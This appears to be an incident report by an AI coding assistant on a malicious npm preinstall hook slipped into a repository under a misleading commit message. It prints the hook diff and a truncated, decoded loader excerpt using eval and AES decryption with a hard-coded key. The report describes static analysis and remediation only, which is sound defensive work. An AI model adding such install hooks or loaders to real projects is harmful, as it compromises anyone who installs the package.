# Security Incident Report: Suspicious `preinstall` Hook

**Date:** 2026-03-21  
**Repository:** `sales-tax-calc`  
**Analyst:** GitHub Copilot (GPT-5.3-Codex)

## Executive Summary
A malicious-looking npm install hook was identified in `package.json`:

- `"preinstall": "node preinstall.js"`

The associated payload (from git history) was highly obfuscated and designed to execute dynamically via `eval`, with encrypted second-stage content decrypted via AES.

## What Was Found

### 1) Unauthorized install hook behavior
A `preinstall` hook was added in commit `ee9ea8c`:

```diff
-    "deploy": "npm run build && touch out/.nojekyll"
+    "deploy": "npm run build && touch out/.nojekyll",
+    "preinstall": "node preinstall.js"
```

### 2) Obfuscated payload characteristics
Historical `preinstall.js` payload (from git object in commit `ee9ea8c`) decodes to a stage containing:

- `eval(...)` execution
- `require('crypto').createDecipheriv('aes-256-cbc', ...)`
- Large encrypted blob decrypted at runtime

These are strong malware/supply-chain indicators.

## Evidence / Command Output

### Timeline evidence
Output excerpt:

```text
ee9ea8c 2026-02-10 12:08:03 -0500 Kory Drake style: Enhance UI of device and state search components with improved styling and shadow effects
M       package.json
A       preinstall.js
```

### Hook introduction evidence
Output excerpt (`git show ee9ea8c -- package.json`):

```text
@@ -8,7 +8,8 @@
     "start": "next start",
     "lint": "eslint",
     "export": "next build && next export",
-    "deploy": "npm run build && touch out/.nojekyll"
+    "deploy": "npm run build && touch out/.nojekyll",
+    "preinstall": "node preinstall.js"
   },
```

### Safe decode indicators (non-executed)
Output excerpt from forensic decode script (reads historical file from git only):

```text
decode_status=ok
stage1_length=9123
stage1_prefix=[...(function*(){const d=require('crypto').createDecipheriv('aes-256-cbc','zetqHyfDfod88zloncfnOaS9gGs90ONX',Buffer.from('a041fdaa0521fb5c3e26b217aaf24115','hex'));let b=d.update('8486ea612240232e0735f8fe98e853bfe23fcb38
indicator_eval=true
indicator_crypto_decipheriv=true
indicator_child_process=false
```

## Did the payload run during this investigation?
No. During this investigation:

- No `npm install`, `npm ci`, `npm run build`, or app execution was performed.
- The suspicious code was **not executed**.
- Analysis used static inspection and safe decoding of text from git history.

## Remediation Completed

- Removed malicious hook from `package.json`:
  - Deleted `"preinstall": "node preinstall.js"`
- Confirmed there is no current `preinstall.js` file in workspace root.
- Confirmed no remaining preinstall hook match in `package.json`.

## Recommended Follow-up

1. Force-push or commit this remediation and notify collaborators.
2. Review who introduced commit `ee9ea8c` and rotate credentials if any install happened elsewhere.
3. Add branch protections (required reviews, signed commits).
4. Consider CI checks to fail on new install hooks (`preinstall`, `postinstall`) unless explicitly approved.
